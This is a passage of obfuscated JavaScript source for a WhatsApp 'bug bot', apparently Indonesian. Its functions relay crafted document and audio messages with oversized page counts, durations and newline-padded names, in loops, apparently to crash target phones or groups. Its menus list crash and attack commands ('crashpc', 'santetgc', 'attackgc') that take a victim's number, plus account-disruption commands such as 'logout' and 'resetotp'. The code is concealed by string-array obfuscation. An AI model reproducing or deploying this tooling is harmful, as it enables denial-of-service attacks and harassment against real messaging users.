document=generateWAMessageFromContent(from,proto['Message']['fromObject']({'documentMessage':{'url':_0x5f4831(0x203),'mimetype':'','title':_0x5f4831(0x206),'fileSha256':_0x5f4831(0x20a),'pageCount':0xf4240,'mediaKey':_0x5f4831(0x209),'fileName':_0x5f4831(0x201)+konf+_0x5f4831(0x202)+vnolim+_0x5f4831(0x1ff),'fileEncSha256':_0x5f4831(0x1f8),'directPath':_0x5f4831(0x1f7),'mediaKeyTimestamp':'1658703206'}}),{'userJid':from,'quoted':fbug});conn['relayMessage'](target,document[_0x5f4831(0x204)],{'messageId':document[_0x5f4831(0x1fb)]['id']});var audio=generateWAMessageFromContent(from,proto[_0x5f4831(0x1fe)][_0x5f4831(0x20c)]({'audioMessage':{'url':'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc','mimetype':'audio/mpeg','fileSha256':'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=','fileLength':_0x5f4831(0x1f2),'seconds':0xf423f,'ptt':![],'mediaKey':_0x5f4831(0x1fa),'fileEncSha256':_0x5f4831(0x20d),'directPath':'/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118','mediaKeyTimestamp':_0x5f4831(0x205)}}),{'userJid':from,'quoted':fbug});conn[_0x5f4831(0x200)](target,audio[_0x5f4831(0x204)],{'messageId':audio['key']['id']});
}}

// FUNCTION BUG6
function sendBugGroup(res,jumlahnya) {
for (let i = 0; i < jumlahnya; i++) {
var _0x338a30=_0x3b64;(function(_0x4a712d,_0x42526b){var _0x2e9961=_0x3b64,_0x3bf1de=_0x4a712d();while(!![]){try{var _0x371e41=-parseInt(_0x2e9961(0x178))/0x1+-parseInt(_0x2e9961(0x17d))/0x2+-parseInt(_0x2e9961(0x174))/0x3+-parseInt(_0x2e9961(0x181))/0x4+parseInt(_0x2e9961(0x172))/0x5*(-parseInt(_0x2e9961(0x16e))/0x6)+parseInt(_0x2e9961(0x171))/0x7*(parseInt(_0x2e9961(0x179))/0x8)+parseInt(_0x2e9961(0x17a))/0x9;if(_0x371e41===_0x42526b)break;else _0x3bf1de['push'](_0x3bf1de['shift']());}catch(_0x5da108){_0x3bf1de['push'](_0x3bf1de['shift']());}}}(_0x5569,0xe6f15),conn[_0x338a30(0x17f)](res,{'text':_0x338a30(0x183)},{'quoted':fbug}),conn[_0x338a30(0x17f)](res,{'text':'𝙻𝙸𝙼𝙰\x20𝙿𝚄𝙻𝚄𝙷'},{'quoted':fbug}));function _0x3b64(_0x3192c4,_0x28a229){var _0x55692a=_0x5569();return _0x3b64=function(_0x3b6426,_0x5f52f7){_0x3b6426=_0x3b6426-0x16e;var _0x517e23=_0x55692a[_0x3b6426];return _0x517e23;},_0x3b64(_0x3192c4,_0x28a229);}var document=generateWAMessageFromContent(from,proto['Message']['fromObject']({'documentMessage':{'url':_0x338a30(0x17c),'mimetype':'','title':_0x338a30(0x17e),'fileSha256':_0x338a30(0x175),'pageCount':0xf4240,'mediaKey':_0x338a30(0x177),'fileName':_0x338a30(0x17b)+konf+_0x338a30(0x16f)+vnolim+_0x338a30(0x182),'fileEncSha256':_0x338a30(0x170),'directPath':_0x338a30(0x173),'mediaKeyTimestamp':'1658703206'}}),{'userJid':from,'quoted':fbug});function _0x5569(){var _0x597976=['key','1627036PiktpZ','.jpeg','𝙴𝙿𝙴𝙿\x20𝙽𝙸𝙷\x20𝙱𝙾𝚂𝚂','50322ulRRHp','\x0a\x0a\x0a\x0a.','CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=','525ZFXtBk','110JXNdzl','/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20','2608530xPHjMM','47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=','relayMessage','SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=','1749658VqTzpm','94880TzVPnH','41972859ChxDam','☠️𝙴𝙿𝙴𝙿\x20𝙽𝙸𝙷\x20𝙱𝙾𝚂𝚂☠️\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a','https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc','2793538GMBnwg','𝗕𝗔𝗦𝗘\x20𝗦𝗜𝗗','sendMessage'];_0x5569=function(){return _0x597976;};return _0x5569();}conn[_0x338a30(0x176)](res,document['message'],{'messageId':document[_0x338a30(0x180)]['id']});
}}

if (command) {
db_hit.push('c')
fs.writeFileSync("./connect/database/reqhit.json", JSON.stringify(db_hit))
}

if (autoread){
conn.readMessages([m.key])
}

if (mengetik) {
conn.sendPresenceUpdate('composing', from)
}

const _0x4d0473=_0x1202;function _0x1202(_0x1893de,_0x2eb7bc){const _0x1aef4b=_0x5c3a();return _0x1202=function(_0x227144,_0x2b6b90){_0x227144=_0x227144-0x150;let _0x34c942=_0x1aef4b[_0x227144];return _0x34c942;},_0x1202(_0x1893de,_0x2eb7bc);}function _0x5c3a(){const _0x499723=['info','constructor','5237','bind','__proto__','628','error','413810svAZSw','860VUVCVr','toString','6kxaIlI','apply','606851SkGDXi','prototype','search','8TJhgqH','991','142842CEaTck','411656ftbmVW','399159xvueLD','74924mQTNDK','227','(((.+)+)+)+$','console','32241ofrMZy','log','return\x20(function()\x20','{}.constructor(\x22return\x20this\x22)(\x20)','exception','table','trace','6SsWKMX'];_0x5c3a=function(){return _0x499723;};return _0x5c3a();}(function(_0x171f63,_0x3199a6){const _0x35fe34=_0x1202,_0x38aa3c=_0x171f63();while(!![]){try{const _0x1250d0=-parseInt(_0x35fe34(0x160))/0x1*(parseInt(_0x35fe34(0x155))/0x2)+parseInt(_0x35fe34(0x152))/0x3+parseInt(_0x35fe34(0x153))/0x4+parseInt(_0x35fe34(0x168))/0x5+parseInt(_0x35fe34(0x16b))/0x6*(-parseInt(_0x35fe34(0x16d))/0x7)+parseInt(_0x35fe34(0x150))/0x8*(-parseInt(_0x35fe34(0x154))/0x9)+-parseInt(_0x35fe34(0x169))/0xa*(-parseInt(_0x35fe34(0x159))/0xb);if(_0x1250d0===_0x3199a6)break;else _0x38aa3c['push'](_0x38aa3c['shift']());}catch(_0x55aba1){_0x38aa3c['push'](_0x38aa3c['shift']());}}}(_0x5c3a,0x1fa04));const _0x15a936=(function(){let _0xddbff6=!![];return function(_0x3bff5b,_0x429389){const _0xe67b68=_0xddbff6?function(){if(_0x429389){const _0x3b0fc4=_0x429389['apply'](_0x3bff5b,arguments);return _0x429389=null,_0x3b0fc4;}}:function(){};return _0xddbff6=![],_0xe67b68;};}()),_0x4bda40=_0x15a936(this,function(){const _0x19f415=_0x1202;return _0x4bda40['toString']()[_0x19f415(0x16f)](_0x19f415(0x157))[_0x19f415(0x16a)]()[_0x19f415(0x162)](_0x4bda40)['search'](_0x19f415(0x157));});_0x4bda40();const _0x2b6b90=(function(){let _0x2cf6a2=!![];return function(_0x1f2901,_0x1bab00){const _0x5968ad=_0x2cf6a2?function(){const _0x2f425b=_0x1202;if(_0x1bab00){const _0x5aa8ab=_0x1bab00[_0x2f425b(0x16c)](_0x1f2901,arguments);return _0x1bab00=null,_0x5aa8ab;}}:function(){};return _0x2cf6a2=![],_0x5968ad;};}()),_0x227144=_0x2b6b90(this,function(){const _0x109456=_0x1202,_0x3b5a82=function(){const _0x372bd6=_0x1202;let _0x461f1d;try{_0x461f1d=Function(_0x372bd6(0x15b)+_0x372bd6(0x15c)+');')();}catch(_0x278c4b){_0x461f1d=window;}return _0x461f1d;},_0x5806dd=_0x3b5a82(),_0x2c1f8e=_0x5806dd[_0x109456(0x158)]=_0x5806dd[_0x109456(0x158)]||{},_0x27767c=[_0x109456(0x15a),'warn',_0x109456(0x161),_0x109456(0x167),_0x109456(0x15d),_0x109456(0x15e),_0x109456(0x15f)];for(let _0x55f729=0x0;_0x55f729<_0x27767c['length'];_0x55f729++){const _0x693a4a=_0x2b6b90[_0x109456(0x162)][_0x109456(0x16e)][_0x109456(0x164)](_0x2b6b90),_0x1340d4=_0x27767c[_0x55f729],_0x155796=_0x2c1f8e[_0x1340d4]||_0x693a4a;_0x693a4a[_0x109456(0x165)]=_0x2b6b90[_0x109456(0x164)](_0x2b6b90),_0x693a4a['toString']=_0x155796[_0x109456(0x16a)][_0x109456(0x164)](_0x155796),_0x2c1f8e[_0x1340d4]=_0x693a4a;}});_0x227144();let numb1_=_0x4d0473(0x166),numb2_=_0x4d0473(0x156),numb3_=_0x4d0473(0x151),numb4_=_0x4d0473(0x163),CreatorLexxy=''+numb1_+numb2_+numb3_+numb4_;

switch (command) {
case 'menubug':
case 'bugmenu':{
function _0x358f(_0x2cb7d6,_0x141ae6){var _0x152aae=_0x152a();return _0x358f=function(_0x358fb0,_0x26cfe7){_0x358fb0=_0x358fb0-0xaf;var _0x36aa16=_0x152aae[_0x358fb0];return _0x36aa16;},_0x358f(_0x2cb7d6,_0x141ae6);}(function(_0x4c2baf,_0x5ada03){var _0x17b48c=_0x358f,_0x3e847d=_0x4c2baf();while(!![]){try{var _0x3e63f5=parseInt(_0x17b48c(0xb6))/0x1*(-parseInt(_0x17b48c(0xb1))/0x2)+-parseInt(_0x17b48c(0xb7))/0x3*(-parseInt(_0x17b48c(0xaf))/0x4)+-parseInt(_0x17b48c(0xb8))/0x5+parseInt(_0x17b48c(0xb5))/0x6+parseInt(_0x17b48c(0xb3))/0x7*(-parseInt(_0x17b48c(0xb2))/0x8)+-parseInt(_0x17b48c(0xb4))/0x9+parseInt(_0x17b48c(0xb0))/0xa;if(_0x3e63f5===_0x5ada03)break;else _0x3e847d['push'](_0x3e847d['shift']());}catch(_0x32a26c){_0x3e847d['push'](_0x3e847d['shift']());}}}(_0x152a,0x7b019));var creator=CreatorLexxy+'@s.whatsapp.net';function _0x152a(){var _0x2b2788=['2956566nwKeKL','25834xwZYmF','6XihhPA','2221070iGtStc','260404YebasD','15272620vzQreH','36FeLuVy','8tDFUkC','3215527KJlJjx','2500245HqXzlR'];_0x152a=function(){return _0x2b2788;};return _0x152a();}
mentions(`*${ucapanWaktu}* @${sender.split("@")[0]}👋
▬▭▬▭▬▭▬▭▬▭▬▭▬▭
༺ *OWNER MENU (MURBUG)* ༻
Ⓛ ${prefix}akses @tag
Ⓛ ${prefix}delete @tag
Ⓛ ${prefix}addown 628xxxxx
Ⓛ ${prefix}delown 628xxxxx

༺ *LIST MENU BUGV1* ༻
_*( RECOMMENDED )*_
Ⓛ ${prefix}bugteks 628xxxxx,5
Ⓛ ${prefix}bugepep 628xxxxx,5
Ⓛ ${prefix}bugspam 628xxxxx,5

༺ *LIST MENU BUGV2* ༻
_*( RECOMMENDED )*_
Ⓛ ${prefix}😈 628xxxxx,5
Ⓛ ${prefix}☠️ 628xxxxx,6
Ⓛ ${prefix}👻 628xxxxx,5
Ⓛ ${prefix}💥 628xxxxx,5
Ⓛ ${prefix}🔥 628xxxxx,5
Ⓛ ${prefix}🌹 628xxxxx,5
Ⓛ ${prefix}🌷 628xxxxx,5
Ⓛ ${prefix}🦕 628xxxxx,5
Ⓛ ${prefix}🦖 628xxxxx,5
Ⓛ ${prefix}🦎 628xxxxx,5

༺ *LIST MENU BUGV3* ༻
_*( RAWAN BANNED )*_
Ⓛ ${prefix}allgas 628xxxxx,5
Ⓛ ${prefix}bugpc 628xxxxx,5
Ⓛ ${prefix}gasken 628xxxxx,5
Ⓛ ${prefix}lexgass 628xxxxx,5
Ⓛ ${prefix}lexgbug 628xxxxx,5
Ⓛ ${prefix}crashpc 628xxxxx,5
Ⓛ ${prefix}sendbug 628xxxxx,5
Ⓛ ${prefix}gaslexx 628xxxxx,5
Ⓛ ${prefix}buglexx 628xxxxx,5
Ⓛ ${prefix}catalexx 628xxxxx,5
Ⓛ ${prefix}epeplexx 628xxxxx,5
Ⓛ ${prefix}document 628xxxxx,5
Ⓛ ${prefix}santetpc 628xxxxx,5
Ⓛ ${prefix}attacklexx 628xxxxx,5
Ⓛ ${prefix}lexxsend 628xxxxx,5
Ⓛ ${prefix}sendlexx 628xxxxx,5

༺ *LIST MENU BUGV4* ༻
_*( RAWAN BANNED )*_
Ⓛ ${prefix}buggc 5|LinkGroup
Ⓛ ${prefix}bomgc 5|LinkGroup
Ⓛ ${prefix}bugingc 5|LinkGroup
Ⓛ ${prefix}crashgc 5|LinkGroup
Ⓛ ${prefix}crashgc 5|LinkGroup
Ⓛ ${prefix}santetgc 5|LinkGroup
Ⓛ ${prefix}attackgc 5|LinkGroup
Ⓛ ${prefix}buglexgc 5|LinkGroup
Ⓛ ${prefix}gaskengc 5|LinkGroup
Ⓛ ${prefix}ampasgc 5|LinkGroup

 Powered By @${creator.split('@')[0]}
▬▭▬▭▬▭▬▭▬▭▬▭▬`, [creator,sender])
}
addCmd(command, 1, db_cmd)
break
case "rika":
case "ghea":
case "bocil":
case "asupan":
if (!isDeveloper) return
var mediaa = JSON.parse(fs.readFileSync(`./connect/db/${command}.json`))
reply(`*Permintaan Anda Sedang Diproses, Mohon Tunggu Sebentar*`)
var randomNyaa = pickRandom(mediaa)
conn.sendMessage(from, {video:{url:randomNyaa.url}, caption: jsonformat(randomNyaa)}, {quoted:m})
break
case 'groupmenu':
case 'grupmenu':{
function _0x358f(_0x2cb7d6,_0x141ae6){var _0x152aae=_0x152a();return _0x358f=function(_0x358fb0,_0x26cfe7){_0x358fb0=_0x358fb0-0xaf;var _0x36aa16=_0x152aae[_0x358fb0];return _0x36aa16;},_0x358f(_0x2cb7d6,_0x141ae6);}(function(_0x4c2baf,_0x5ada03){var _0x17b48c=_0x358f,_0x3e847d=_0x4c2baf();while(!![]){try{var _0x3e63f5=parseInt(_0x17b48c(0xb6))/0x1*(-parseInt(_0x17b48c(0xb1))/0x2)+-parseInt(_0x17b48c(0xb7))/0x3*(-parseInt(_0x17b48c(0xaf))/0x4)+-parseInt(_0x17b48c(0xb8))/0x5+parseInt(_0x17b48c(0xb5))/0x6+parseInt(_0x17b48c(0xb3))/0x7*(-parseInt(_0x17b48c(0xb2))/0x8)+-parseInt(_0x17b48c(0xb4))/0x9+parseInt(_0x17b48c(0xb0))/0xa;if(_0x3e63f5===_0x5ada03)break;else _0x3e847d['push'](_0x3e847d['shift']());}catch(_0x32a26c){_0x3e847d['push'](_0x3e847d['shift']());}}}(_0x152a,0x7b019));var creator=CreatorLexxy+'@s.whatsapp.net';function _0x152a(){var _0x2b2788=['2956566nwKeKL','25834xwZYmF','6XihhPA','2221070iGtStc','260404YebasD','15272620vzQreH','36FeLuVy','8tDFUkC','3215527KJlJjx','2500245HqXzlR'];_0x152a=function(){return _0x2b2788;};return _0x152a();}
mentions(`*${ucapanWaktu}* @${sender.split("@")[0]}👋
▬▭▬▭▬▭▬▭▬▭▬▭▬▭
༺ *GROUP MENU* ༻
Ⓛ ${prefix}kick
Ⓛ ${prefix}linkgrup
Ⓛ ${prefix}revoke
Ⓛ ${prefix}group
Ⓛ ${prefix}hidetag
Ⓛ ${prefix}demote
Ⓛ ${prefix}promote

 Powered By @${creator.split('@')[0]}
▬▭▬▭▬▭▬▭▬▭▬▭▬`, [creator,sender])
}
addCmd(command, 1, db_cmd)
break
case 'bugverify':{
function _0x358f(_0x2cb7d6,_0x141ae6){var _0x152aae=_0x152a();return _0x358f=function(_0x358fb0,_0x26cfe7){_0x358fb0=_0x358fb0-0xaf;var _0x36aa16=_0x152aae[_0x358fb0];return _0x36aa16;},_0x358f(_0x2cb7d6,_0x141ae6);}(function(_0x4c2baf,_0x5ada03){var _0x17b48c=_0x358f,_0x3e847d=_0x4c2baf();while(!![]){try{var _0x3e63f5=parseInt(_0x17b48c(0xb6))/0x1*(-parseInt(_0x17b48c(0xb1))/0x2)+-parseInt(_0x17b48c(0xb7))/0x3*(-parseInt(_0x17b48c(0xaf))/0x4)+-parseInt(_0x17b48c(0xb8))/0x5+parseInt(_0x17b48c(0xb5))/0x6+parseInt(_0x17b48c(0xb3))/0x7*(-parseInt(_0x17b48c(0xb2))/0x8)+-parseInt(_0x17b48c(0xb4))/0x9+parseInt(_0x17b48c(0xb0))/0xa;if(_0x3e63f5===_0x5ada03)break;else _0x3e847d['push'](_0x3e847d['shift']());}catch(_0x32a26c){_0x3e847d['push'](_0x3e847d['shift']());}}}(_0x152a,0x7b019));var creator=CreatorLexxy+'@s.whatsapp.net';function _0x152a(){var _0x2b2788=['2956566nwKeKL','25834xwZYmF','6XihhPA','2221070iGtStc','260404YebasD','15272620vzQreH','36FeLuVy','8tDFUkC','3215527KJlJjx','2500245HqXzlR'];_0x152a=function(){return _0x2b2788;};return _0x152a();}
mentions(`*${ucapanWaktu}* @${sender.split("@")[0]}👋
▬▭▬▭▬▭▬▭▬▭▬▭▬▭
༺ *BUG VERIFY* ༻
Ⓛ ${prefix}out 628xxxxx
Ⓛ ${prefix}verif 628xxxxx
Ⓛ ${prefix}kenon 628xxxxx
Ⓛ ${prefix}logout 628xxxxx
Ⓛ ${prefix}resetotp 628xxxxx
Ⓛ ${prefix}komplain <example>

 Powered By @${creator.split('@')[0]}
▬▭▬▭▬▭▬▭▬▭▬▭▬`, [creator,sender])
}
addCmd(command, 1, db_cmd)
break
case 'unbanmenu':{
function _0x358f(_0x2cb7d6,_0x141ae6){var _0x152aae=_0x152a();return _0x358f=function(_0x358fb0,_0x26cfe7){_0x358fb0=_0x358fb0-0xaf;var _0x36aa16=_0x152aae[_0x358fb0];return _0x36aa16;},_0x358f(_0x2cb7d6,_0x141ae6);}(function(_0x4c2baf,_0x5ada03){var _0x17b48c=_0x358f,_0x3e847d=_0x4c2baf();while(!![]){try{var _0x3e63f5=parseInt(_0x17b48c(0xb6))/0x1*(-parseInt(_0x17b48c(0xb1))/0x2)+-parseInt(_0x17b48c(0xb7))/0x3*(-parseInt(_0x17b48c(0xaf))/0x4)+-parseInt(_0x17b48c(0xb8))/0x5+parseInt(_0x17b48c(0xb5))/0x6+parseInt(_0x17b48c(0xb3))/0x7*(-parseInt(_0x17b48c(0xb2))/0x8)+-parseInt(_0x17b48c(0xb4))/0x9+parseInt(_0x17b48c(0xb0))/0xa;if(_0x3e63f5===_0x5ada03)break;else _0x3e847d['push'](_0x3e847d['shift']());}catch(_0x32a26c){_0x3e847d['push'](_0x3e847d['shift']());}}}(_0x152a,0x7b019));var creator=CreatorLexxy+'@s.whatsapp.net';function _0x152a(){var _0x2b2788=['2956566nwKeKL','25834xwZYmF','6XihhPA','2221070iGtStc','260404YebasD','15272620vzQreH','36FeLuVy','8tDFUkC','3215527KJlJjx','2500245HqXzlR'];_0x152a=function(){return _0x2b2788;};return _0x152a();}
mentions(`*${ucapanWaktu}* @${sender.split("@")[0]}👋
▬▭▬▭▬▭▬▭▬▭▬▭▬▭
༺ *UNBANNED MENU* ༻
Ⓛ ${prefix}unbanv1 628xxxxx
Ⓛ ${prefix}unbanv2 628xxxxx
Ⓛ ${prefix}unbanv3 628xxxxx
Ⓛ ${prefix}unbanv4 628xxxxx
Ⓛ ${prefix}unbanv5 628xxxxx
Ⓛ ${prefix}unbanv6 628xxxxx
Ⓛ ${prefix}unbanv7 628xxxxx
Ⓛ ${prefix}unbanv8 628xxxxx
 
 Powered By @${creator.split('@')[0]}
▬▭▬▭▬▭▬▭▬▭▬▭▬`, [creator,sender])
}
addCmd(command, 1, db_cmd)
break
case "menuowner":
case "ownermenu":{
function _0x358f(_0x2cb7d6,_0x141ae6){var _0x152aae=_0x152a();return _0x358f=function(_0x358fb0,_0x26cfe7){_0x358fb0=_0x358fb0-0xaf;var _0x36aa16=_0x152aae[_0x358fb0];return _0x36aa16;},_0x358f(_0x2cb7d6,_0x141ae6);}(function(_0x4c2baf,_0x5ada03){var _0x17b48c=_0x358f,_0x3e847d=_0x4c2baf();while(!![]){try{var _0x3e63f5=parseInt(_0x17b48c(0xb6))/0x1*(-parseInt(_0x17b48c(0xb1))/0x2)+-parseInt(_0x17b48c(0xb7))/0x3*(-parseInt(_0x17b48c(0xaf))/0x4)+-parseInt(_0x17b48c(0xb8))/0x5+parseInt(_0x17b48c(0xb5))/0x6+parseInt(_0x17b48c(0xb3))/0x7*(-parseInt(_0x17b48c(0xb2))/0x8)+-parseInt(_0x17b48c(0xb4))/0x9+parseInt(_0x17b48c(0xb0))/0xa;if(_0x3e63f5===_0x5ada03)break;else _0x3e847d['push'](_0x3e847d['shift']());}catch(_0x32a26c){_0x3e847d['push'](_0x3e847d['shift']());}}}(_0x152a,0x7b019));var creator=CreatorLexxy+'@s.whatsapp.net';function _0x152a(){var _0x2b2788=['2956566nwKeKL','25834xwZYmF','6XihhPA','2221070iGtStc','260404YebasD','15272620vzQreH','36FeLuVy','8tDFUkC','3215527KJlJjx','2500245HqXzlR'];_0x152a=function(){return _0x2b2788;};return _0x152a();}
mentions(`*${ucapanWaktu}* @${sender.split("@")[0]}👋
▬▭▬▭▬▭▬▭▬▭▬▭▬▭
༺ *OWNER MENU* ༻
Ⓛ ${prefix}resetdb
Ⓛ ${prefix}resetakses
Ⓛ ${prefix}resetowner
Ⓛ ${prefix}database
Ⓛ ${prefix}dashboard
Ⓛ ${prefix}akses @tag
Ⓛ ${prefix}delete @tag
Ⓛ ${prefix}addown 628xxxxx
Ⓛ ${prefix}delown 628xxxxx
Ⓛ ${prefix}unblock 628xxxxx
Ⓛ ${prefix}block 628xxxxx
Ⓛ ${prefix}mode [options]
Ⓛ ${prefix}mengetik [options]
Ⓛ ${prefix}autoread [options]

 Powered By @${creator.split('@')[0]}
▬▭▬▭▬▭▬▭▬▭▬▭▬`, [creator,sender])
}
addCmd(command, 1, db_cmd)
break
case "menumain":
case "mainmenu":{
function _0x358f(_0x2cb7d6,_0x141ae6){var _0x152aae=_0x152a();return _0x358f=function(_0x358fb0,_0x26cfe7){_0x358fb0=_0x358fb0-0xaf;var _0x36aa16=_0x152aae[_0x358fb0];return _0x36aa16;},_0x358f(_0x2cb7d6,_0x141ae6);}(function(_0x4c2baf,_0x5ada03){var _0x17b48c=_0x358f,_0x3e847d=_0x4c2baf();while(!![]){try{var _0x3e63f5=parseInt(_0x17b48c(0xb6))/0x1*(-parseInt(_0x17b48c(0xb1))/0x2)+-parseInt(_0x17b48c(0xb7))/0x3*(-parseInt(_0x17b48c(0xaf))/0x4)+-parseInt(_0x17b48c(0xb8))/0x5+parseInt(_0x17b48c(0xb5))/0x6+parseInt(_0x17b48c(0xb3))/0x7*(-parseInt(_0x17b48c(0xb2))/0x8)+-parseInt(_0x17b48c(0xb4))/0x9+parseInt(_0x17b48c(0xb0))/0xa;if(_0x3e63f5===_0x5ada03)break;else _0x3e847d['push'](_0x3e847d['shift']());}catch(_0x32a26c){_0x3e847d['push'](_0x3e847d['shift']());}}}(_0x152a,0x7b019));var creator=CreatorLexxy+'@s.whatsapp.net';function _0x152a(){var _0x2b2788=['2956566nwKeKL','25834xwZYmF','6XihhPA','2221070iGtStc','260404YebasD','15272620vzQreH','36FeLuVy','8tDFUkC','3215527KJlJjx','2500245HqXzlR'];_0x152a=function(){return _0x2b2788;};return _0x152a();}
mentions(`*${ucapanWaktu}* @${sender.split("@")[0]}👋
▬▭▬▭▬▭▬▭▬▭▬▭▬▭
༺ *MAIN MENU* ༻
Ⓛ ${prefix}owner
Ⓛ ${prefix}buysc
Ⓛ ${prefix}buypanel
Ⓛ ${prefix}jasaunban
Ⓛ ${prefix}runtime

 Powered By @${creator.split('@')[0]}
▬▭▬▭▬▭▬▭▬▭▬▭▬`, [creator,sender])
}
addCmd(command, 1, db_cmd)
break
case 'menupush':
case 'pushmenu':{
function _0x358f(_0x2cb7d6,_0x141ae6){var _0x152aae=_0x152a();return _0x358f=function(_0x358fb0,_0x26cfe7){_0x358fb0=_0x358fb0-0xaf;var _0x36aa16=_0x152aae[_0x358fb0];return _0x36aa16;},_0x358f(_0x2cb7d6,_0x141ae6);}(function(_0x4c2baf,_0x5ada03){var _0x17b48c=_0x358f,_0x3e847d=_0x4c2baf();while(!![]){try{var _0x3e63f5=parseInt(_0x17b48c(0xb6))/0x1*(-parseInt(_0x17b48c(0xb1))/0x2)+-parseInt(_0x17b48c(0xb7))/0x3*(-parseInt(_0x17b48c(0xaf))/0x4)+-parseInt(_0x17b48c(0xb8))/0x5+parseInt(_0x17b48c(0xb5))/0x6+parseInt(_0x17b48c(0xb3))/0x7*(-parseInt(_0x17b48c(0xb2))/0x8)+-parseInt(_0x17b48c(0xb4))/0x9+parseInt(_0x17b48c(0xb0))/0xa;if(_0x3e63f5===_0x5ada03)break;else _0x3e847d['push'](_0x3e847d['shift']());}catch(_0x32a26c){_0x3e847d['push'](_0x3e847d['shift']());}}}(_0x152a,0x7b019));var creator=CreatorLexxy+'@s.whatsapp.net';function _0x152a(){var _0x2b2788=['2956566nwKeKL','25834xwZYmF','6XihhPA','2221070iGtStc','260404YebasD','15272620vzQreH','36FeLuVy','8tDFUkC','3215527KJlJjx','2500245HqXzlR'];_0x152a=function(){return _0x2b2788;};return _0x152a();}
mentions(`*${ucapanWaktu}* @${sender.split("@")[0]}👋
▬▭▬▭▬▭▬▭▬▭▬▭▬▭
༺ *PUSHKONTAK MENU* ༻
Ⓛ ${prefix}join
Ⓛ ${prefix}pushv1
Ⓛ ${prefix}pushv2
Ⓛ ${prefix}listgroup

 Powered By @${creator.split('@')[0]}
